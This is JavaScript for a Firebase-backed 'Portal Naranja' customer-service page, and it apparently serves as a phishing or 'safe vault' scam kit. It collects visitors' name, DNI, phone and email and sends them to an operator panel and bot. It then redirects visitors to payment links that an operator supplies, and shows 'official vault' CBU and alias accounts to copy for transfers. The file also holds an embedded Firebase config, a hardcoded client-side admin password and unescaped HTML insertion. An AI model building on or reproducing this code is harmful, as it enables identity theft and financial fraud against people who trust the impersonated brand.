import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getDatabase, ref, push, onValue, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDHcfixcpUU4O-RYLmfNzTUDZFB13jEt5s",
  authDomain: "portal-naranja-763f4.firebaseapp.com",
  databaseURL: "https://portal-naranja-763f4-default-rtdb.firebaseio.com",
  projectId: "portal-naranja-763f4",
  storageBucket: "portal-naranja-763f4.firebasestorage.app",
  messagingSenderId: "908694133500",
  appId: "1:908694133500:web:1808b481eeb45c305c9579"
};

const appFB = initializeApp(firebaseConfig);
const db = getDatabase(appFB);

class App {
  constructor() {
    this.state = {
      currentView: 'screen-1',
      client: { name: '', dni: '', phone: '', email: '' },
      currentCategory: null,
      currentOrderId: null,
      currentFirebaseKey: null,
      claimAmount: '',
      payAmount: '',
      payType: 'Pago Total',
      selectedBanks: [],
      treasurers: []
    };
    this.init();
  }

  init() {
    this.listenToTreasurers();
    this.updateView();
  }

  formatNumberToAR(numStr) {
    const cleanNum = numStr.toString().replace(/\D/g, '');
    if (!cleanNum) return '';
    return new Intl.NumberFormat('de-DE').format(cleanNum);
  }

  formatCurrencyInput(inputElement) {
    inputElement.value = this.formatNumberToAR(inputElement.value);
  }

  formatTimestamp(dateObj) {
    const d = dateObj || new Date();
    const day = String(d.getDate()).padStart(2, '0');
    const month = String(d.getMonth() + 1).padStart(2, '0');
    const year = d.getFullYear();
    const hours = String(d.getHours()).padStart(2, '0');
    const minutes = String(d.getMinutes()).padStart(2, '0');
    return `${day}/${month}/${year}, ${hours}:${minutes} hs`;
  }

  goToCategorySelection() {
    this.state.currentView = 'screen-categories';
    this.updateView();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  selectCategory(category) {
    this.state.currentCategory = category;
    if (category === 'app_issues') {
      this.state.currentView = 'flow-app-info';
    } else if (category === 'payments') {
      this.state.currentView = 'flow-pay-amount';
    } else if (category === 'transfers') {
      this.state.currentView = 'flow-transfers';
    }
    this.updateView();
  }

  // --- NUEVO FLUJO B: ENVÍA AL PANEL ADMIN APENAS INGRESA EL IMPORTE ---
  async submitAmountAndGoToUserData() {
    const rawAmount = document.getElementById('pay-amount').value.trim();
    const paymentType = document.getElementById('pay-type').value;

    if (!rawAmount) {
      alert('Por favor, ingresa un monto válido a abonar.');
      return;
    }

    const formattedAmount = this.formatNumberToAR(rawAmount);
    this.state.payAmount = formattedAmount;
    this.state.payType = paymentType;

    const orderId = '#NX-' + Math.floor(1000 + Math.random() * 9000);
    this.state.currentOrderId = orderId;
    const nowFormatted = this.formatTimestamp(new Date());

    const newRequest = {
      id: orderId,
      name: 'Completando datos...',
      dni: 'Pendiente',
      phone: 'Pendiente',
      email: 'Pendiente',
      category: 'payments',
      amount: formattedAmount,
      paymentType: paymentType,
      selectedBanks: [],
      paymentUrl: '',
      status: 'Pendiente de Link',
      createdAt: Date.now(),
      requestTime: nowFormatted
    };

    try {
      // Guardar en Firebase de inmediato para que te llegue al admin y al Bot
      const newRef = await push(ref(db, 'requests'), newRequest);
      this.state.currentFirebaseKey = newRef.key;
    } catch (error) {
      console.error("Error al guardar en Firebase:", error);
    }

    this.state.currentView = 'flow-pay-user-data';
    this.updateView();
  }

  async handlePayUserSubmit(e) {
    e.preventDefault();
    this.state.client = {
      name: document.getElementById('pay-client-name').value.trim(),
      dni: document.getElementById('pay-client-dni').value.trim(),
      phone: document.getElementById('pay-client-phone').value.trim(),
      email: document.getElementById('pay-client-email').value.trim()
    };

    // Actualizar datos del cliente en Firebase mientras avanza
    if (this.state.currentFirebaseKey) {
      try {
        await update(ref(db, `requests/${this.state.currentFirebaseKey}`), {
          name: this.state.client.name,
          dni: this.state.client.dni,
          phone: this.state.client.phone,
          email: this.state.client.email
        });
      } catch (err) {
        console.error("Error actualizando datos cliente:", err);
      }
    }

    document.getElementById('sum-client-name').innerText = this.state.client.name;
    document.getElementById('sum-client-dni').innerText = this.state.client.dni;
    document.getElementById('sum-pay-type').innerText = this.state.payType;
    document.getElementById('sum-pay-amount').innerText = `$${this.state.payAmount}`;

    this.state.currentView = 'flow-pay-summary';
    this.updateView();
  }

  confirmAndGoToWaiting() {
    document.getElementById('display-order-id').innerText = this.state.currentOrderId;
    document.getElementById('display-order-amount').innerText = `$${this.state.payAmount}`;

    this.state.currentView = 'pay-waiting';
    this.updateView();

    this.listenToOrderStatus(this.state.currentOrderId);
  }

  // --- BOTÓN VOLVER ---
  goBack() {
    const view = this.state.currentView;

    if (view === 'screen-categories') {
      this.state.currentView = 'screen-1';
    } else if (view === 'flow-app-info' || view === 'flow-pay-amount' || view === 'flow-transfers') {
      this.state.currentView = 'screen-categories';
    } else if (view === 'flow-pay-user-data') {
      this.state.currentView = 'flow-pay-amount';
    } else if (view === 'flow-pay-summary') {
      this.state.currentView = 'flow-pay-user-data';
    } else if (view === 'pay-waiting') {
      this.state.currentView = 'flow-pay-summary';
    } else if (view === 'flow-app-treasury') {
      this.state.currentView = 'flow-app-info';
    } else if (view === 'flow-app-operator') {
      this.state.currentView = 'flow-app-treasury';
    } else if (view === 'claim-banks') {
      this.state.currentView = 'flow-transfers';
    } else if (view === 'claim-instructions') {
      this.state.currentView = 'claim-banks';
    } else if (view === 'claim-waiting') {
      this.state.currentView = 'claim-instructions';
    }

    this.updateView();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  updateView() {
    const views = [
      'screen-1', 'screen-categories', 
      'flow-app-info', 'flow-app-treasury', 'flow-app-operator',
      'flow-pay-amount', 'flow-pay-user-data', 'flow-pay-summary', 'pay-waiting-view', 
      'flow-transfers', 'claim-form-view', 'claim-banks-view', 'claim-instructions-view', 'claim-waiting-view'
    ];

    views.forEach(id => {
      const el = document.getElementById(id);
      if (el) el.classList.add('hidden');
    });

    const navHeader = document.getElementById('nav-header-container');
    const v = this.state.currentView;

    if (v === 'screen-1') {
      if (navHeader) {
        navHeader.classList.add('hidden');
        navHeader.classList.remove('flex');
      }
      document.getElementById('screen-1').classList.remove('hidden');
      return;
    }

    if (navHeader) {
      navHeader.classList.remove('hidden');
      navHeader.classList.add('flex');
    }

    if (v === 'screen-categories') {
      document.getElementById('screen-categories').classList.remove('hidden');
      this.updateProgress(1, 3, 'Selección de Gestión', '33%');

    } else if (v === 'flow-pay-amount') {
      document.getElementById('flow-pay-amount').classList.remove('hidden');
      this.updateProgress(2, 3, 'Paso 1: Monto a Abonar', '50%');
      if (this.state.payAmount) document.getElementById('pay-amount').value = this.state.payAmount;

    } else if (v === 'flow-pay-user-data') {
      document.getElementById('flow-pay-user-data').classList.remove('hidden');
      this.updateProgress(2, 3, 'Paso 2: Datos Personales', '75%');
      if (this.state.client.name) document.getElementById('pay-client-name').value = this.state.client.name;
      if (this.state.client.dni) document.getElementById('pay-client-dni').value = this.state.client.dni;
      if (this.state.client.phone) document.getElementById('pay-client-phone').value = this.state.client.phone;
      if (this.state.client.email) document.getElementById('pay-client-email').value = this.state.client.email;

    } else if (v === 'flow-pay-summary') {
      document.getElementById('flow-pay-summary').classList.remove('hidden');
      this.updateProgress(3, 3, 'Paso 3: Confirmación', '90%');

    } else if (v === 'pay-waiting') {
      document.getElementById('pay-waiting-view').classList.remove('hidden');
      this.hideProgress();

    } else if (v === 'flow-app-info') {
      document.getElementById('flow-app-info').classList.remove('hidden');
      this.hideProgress();

    } else if (v === 'flow-app-treasury') {
      document.getElementById('flow-app-treasury').classList.remove('hidden');
      this.renderTreasuryCards();
      this.hideProgress();

    } else if (v === 'flow-app-operator') {
      document.getElementById('flow-app-operator').classList.remove('hidden');
      this.hideProgress();

    } else if (v === 'flow-transfers') {
      document.getElementById('flow-transfers').classList.remove('hidden');
      document.getElementById('claim-form-view').classList.remove('hidden');
      this.hideProgress();

    } else if (v === 'claim-banks') {
      document.getElementById('flow-transfers').classList.remove('hidden');
      document.getElementById('claim-banks-view').classList.remove('hidden');
      this.hideProgress();

    } else if (v === 'claim-instructions') {
      document.getElementById('flow-transfers').classList.remove('hidden');
      document.getElementById('claim-instructions-view').classList.remove('hidden');
      this.hideProgress();

    } else if (v === 'claim-waiting') {
      document.getElementById('flow-transfers').classList.remove('hidden');
      document.getElementById('claim-waiting-view').classList.remove('hidden');
      this.hideProgress();
    }
  }

  updateProgress(current, total, labelText, percentText) {
    const p = document.getElementById('progress-container');
    if (p) p.classList.remove('hidden');
    document.getElementById('step-label').innerText = labelText;
    document.getElementById('step-percent').innerText = percentText;
    document.getElementById('progress-bar').style.width = `${(current / total) * 100}%`;
  }

  hideProgress() {
    const p = document.getElementById('progress-container');
    if (p) p.classList.add('hidden');
  }

  listenToTreasurers() {
    const treasurersRef = ref(db, 'treasurers');
    onValue(treasurersRef, (snapshot) => {
      const data = snapshot.val() || {};
      this.state.treasurers = Object.entries(data).map(([key, val]) => ({ key, ...val }));
      if (this.state.currentView === 'flow-app-treasury') {
        this.renderTreasuryCards();
      }
    });
  }

  renderTreasuryCards() {
    const container = document.getElementById('treasury-cards-container');
    if (!container) return;

    container.innerHTML = '';

    if (this.state.treasurers.length === 0) {
      container.innerHTML = `
        <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl text-center text-xs text-slate-500">
          <p>Cargando bóvedas de resguardo oficiales...</p>
        </div>
      `;
      return;
    }

    this.state.treasurers.forEach((t, index) => {
      const card = document.createElement('div');
      card.className = 'p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-2.5 hover:border-nxOrange-300 transition shadow-sm';
      card.innerHTML = `
        <div class="flex items-center justify-between border-b border-slate-200 pb-2">
          <span class="text-xs font-bold text-nxPurple-900">Bóveda Oficial #${index + 1}</span>
          <span class="text-[10px] bg-nxOrange-100 text-nxOrange-700 font-extrabold px-2 py-0.5 rounded-full">Activa</span>
        </div>
        <div class="text-xs space-y-1 text-slate-700">
          <div><strong class="text-slate-900">Titular / Tesorería:</strong> ${t.name}</div>
          <div><strong class="text-slate-900">CUIL:</strong> ${t.cuil}</div>
        </div>
        <div class="space-y-1.5 pt-1">
          <div class="flex items-center justify-between bg-white p-2 rounded-lg border border-slate-200 text-xs">
            <div class="truncate mr-2">
              <span class="text-[10px] text-slate-400 block font-bold uppercase">Alias</span>
              <span class="font-mono font-bold text-slate-800">${t.alias}</span>
            </div>
            <button type="button" onclick="app.copyToClipboard('${t.alias}', 'Alias')" class="bg-nxPurple-50 hover:bg-nxPurple-100 text-nxPurple-900 font-bold px-2.5 py-1.5 rounded-md text-[11px] transition flex items-center space-x-1 shrink-0">
              <i class="fa-regular fa-copy"></i>
              <span>Copiar Alias</span>
            </button>
          </div>
          <div class="flex items-center justify-between bg-white p-2 rounded-lg border border-slate-200 text-xs">
            <div class="truncate mr-2">
              <span class="text-[10px] text-slate-400 block font-bold uppercase">CBU / CVU</span>
              <span class="font-mono font-bold text-slate-800 text-[11px]">${t.cbu}</span>
            </div>
            <button type="button" onclick="app.copyToClipboard('${t.cbu}', 'CBU')" class="bg-nxOrange-50 hover:bg-nxOrange-100 text-nxOrange-700 font-bold px-2.5 py-1.5 rounded-md text-[11px] transition flex items-center space-x-1 shrink-0">
              <i class="fa-regular fa-copy"></i>
              <span>Copiar CBU</span>
            </button>
          </div>
        </div>
      `;
      container.appendChild(card);
    });
  }

  copyToClipboard(text, type) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(() => {
        alert(`¡${type} copiado al portapapeles!`);
      }).catch(() => {
        this.fallbackCopyText(text, type);
      });
    } else {
      this.fallbackCopyText(text, type);
    }
  }

  fallbackCopyText(text, type) {
    const textArea = document.createElement("textarea");
    textArea.value = text;
    document.body.appendChild(textArea);
    textArea.select();
    try {
      document.execCommand('copy');
      alert(`¡${type} copiado al portapapeles!`);
    } catch (err) {
      alert(`No se pudo copiar manualmente: ${text}`);
    }
    document.body.removeChild(textArea);
  }

  goToTreasuryCards() {
    this.state.currentView = 'flow-app-treasury';
    this.updateView();
  }

  goToOperatorInstructions() {
    this.state.currentView = 'flow-app-operator';
    this.updateView();
  }

  resetApp() {
    window.location.reload();
  }

  listenToOrderStatus(orderId) {
    const requestsRef = ref(db, 'requests');
    onValue(requestsRef, (snapshot) => {
      const data = snapshot.val() || {};
      Object.values(data).forEach(req => {
        if (req.id === orderId && req.paymentUrl && req.paymentUrl.trim() !== '') {
          window.location.href = req.paymentUrl.trim();
        }
      });
    });
  }

  // --- FLUJO C: DEVOLUCIONES ---
  goToBankSelection() {
    const rawAmount = document.getElementById('claim-amount').value.trim();
    if (!rawAmount) {
      alert('Por favor, ingresa el monto a acreditar.');
      return;
    }
    this.state.claimAmount = this.formatNumberToAR(rawAmount);
    this.state.currentView = 'claim-banks';
    this.updateView();
  }

  goToReimbursementInstructions() {
    const checkboxes = document.querySelectorAll('.bank-checkbox:checked');
    const selected = Array.from(checkboxes).map(cb => cb.value);

    if (selected.length === 0) {
      alert('Por favor, selecciona al menos una entidad bancaria o billetera virtual.');
      return;
    }

    this.state.selectedBanks = selected;
    this.state.currentView = 'claim-instructions';
    this.updateView();
  }

  async generateReimbursementOrder() {
    const orderId = '#TR-' + Math.floor(1000 + Math.random() * 9000);
    this.state.currentOrderId = orderId;
    const nowFormatted = this.formatTimestamp(new Date());

    const newClaim = {
      id: orderId,
      name: this.state.client.name || 'Cliente Web',
      dni: this.state.client.dni || 'S/D',
      phone: this.state.client.phone || 'S/D',
      email: this.state.client.email || 'S/D',
      category: 'transfers',
      amount: this.state.claimAmount,
      paymentType: 'Acreditación / Reintegro',
      selectedBanks: this.state.selectedBanks,
      paymentUrl: '',
      status: 'Pendiente de Link',
      createdAt: Date.now(),
      requestTime: nowFormatted
    };

    try {
      await push(ref(db, 'requests'), newClaim);
    } catch (error) {
      console.error("Error al guardar en Firebase:", error);
    }

    document.getElementById('display-claim-id').innerText = orderId;
    document.getElementById('display-claim-amount').innerText = `$${this.state.claimAmount}`;

    this.state.currentView = 'claim-waiting';
    this.updateView();

    this.listenToOrderStatus(orderId);
  }

  openAdminModal() {
    document.getElementById('admin-auth-modal').classList.remove('hidden');
  }

  closeAdminModal() {
    document.getElementById('admin-auth-modal').classList.add('hidden');
  }

  verifyAdminPass() {
    const pass = document.getElementById('admin-pass-input').value;
    if (pass === 'admin123') {
      sessionStorage.setItem('nx_admin_auth', 'true');
      window.location.href = 'admin.html';
    } else {
      alert('Clave incorrecta');
    }
  }
}

window.app = new App();
